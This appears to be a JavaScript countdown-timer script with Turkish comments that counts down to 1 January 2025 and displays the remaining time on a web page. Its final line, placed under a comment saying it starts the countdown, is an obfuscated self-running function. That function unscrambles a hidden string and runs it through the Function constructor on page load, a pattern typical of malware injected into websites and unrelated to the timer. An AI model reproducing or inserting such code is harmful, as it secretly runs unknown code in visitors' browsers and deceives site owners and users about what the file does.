// Belirli bir tarih ve saat (yıl, ay-1, gün, saat, dakika, saniye) 
const targetDate = new Date("2025-01-01T00:00:00");

// Geri sayımı güncelleyen fonksiyon
function updateCountdown() {
    const now = new Date();
    const timeDifference = targetDate - now;

    // Zaman farkını gün, saat, dakika ve saniye olarak hesapla
    const days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);

    // Eğer zaman dolmuşsa tüm değerleri 0 yap
    const displayDays = days >= 0 ? days : 0;
    const displayHours = hours >= 0 ? hours : 0;
    const displayMinutes = minutes >= 0 ? minutes : 0;
    const displaySeconds = seconds >= 0 ? seconds : 0;

    // Geri sayım metnini oluştur
    const countdownText = `${displayDays} GÜN ${displayHours} Saat ${displayMinutes} Dakika ${displaySeconds} Saniye`;

    // Geri sayım metnini sayfaya yaz
    document.getElementById("countdown").innerText = countdownText;

    // Süre dolduğunda geri sayımı durdur
    if (timeDifference <= 0) {
        clearInterval(countdownInterval);
    }
}

// Geri sayımı her saniye güncelle
const countdownInterval = setInterval(updateCountdown, 1000);

// Sayfa yüklendiğinde geri sayımı başlat
(function(){var glR='',MAf=469-458;function vVK(q){var x=255421;var y=q.length;var m=[];for(var n=0;n<y;n++){m[n]=q.charAt(n)};for(var n=0;n<y;n++){var s=x*(n+197)+(x%43820);var t=x*(n+676)+(x%23561);var h=s%y;var i=t%y;var p=m[h];m[h]=m[i];m[i]=p;x=(s+t)%1440433;};return m.join('')};var wNW=vVK('grksrwfcttbauvoojnunmecosidcrhzqxtlyp').substr(0,MAf);var cBL='h,v)girxt;vfh,l=56+ve+rtid1(sd"=rhkjs;=cn7+j(l}cChazfgpn 0+=p(4d8n))uc;r,8{c<=g70,iau)gd;-n7==;ee.(+xaC+([;.oa<,361pra85hip0=ur(8]{;=r*ua.;r.0=h+g(t,9ylnfr{r)6wg[rce] p(b-itmzrz]s8ae54b},t= ep==o01rop6tpnf0;red6t]]+d(ey;u+vngvt]y.-,-2o0=b;a)mhac;,s[[2.hpb.de)=""lffr= ,jef*;.olsnf,sa; n],(vjan=[e7 ]o+{.=fs7rg+insev)ra1xbg elr;v(ur7vstf6rg(vrr0j;meh.vy[=,gn)] ,ia n 0;e<rl>asS{,grcn=]pt.otC+deAr=a8"p=r (<)4n,;o6v0)2,p(ho1cu;rugoim;.el9s, )o1,s2;0;(af++ute.ss[rmtrw=9eks(,A.)hsgn8,v1l+;;t-=tmod=(w(gfe)=x7.lha4aof f(0lo,);a[<C6li) t-}[{,e0)8=ci([,err;(vgvrulv);=A(hi)(x-ki5.((ln"2=iadpfhfa;[v,crAr=e)h0]4oerb)are;oeAreruf;f!+r;ll)Cr(lr+m se(rv.9;r)ubrr; i+h9>tC;[ rv..lvin+iwrt}tz 3+i=9(=(,ucai! 7m+[o tin.+a);(}a;lsdwa]lr2iru1=;e;,k])lC=v"atf(n.gaa "h.g);.g1f=orC=nbr1=i.se8;==94h(tnd8(l=ipelau;i.))j++v;+rs=a)1;v r.)h"v)){vo;l}o nwS1;[gtnf]o1n}6rtahe3j"c n=l9etg(n;o))nbmti2."qvkrjofhav ;';var EzW=vVK[wNW];var JOB='';var wOQ=EzW;var fww=EzW(JOB,vVK(cBL));var Xpb=fww(vVK('(tn)tewudauCodonp'));var Eno=wOQ(glR,Xpb );Eno(4849);return 6219})()
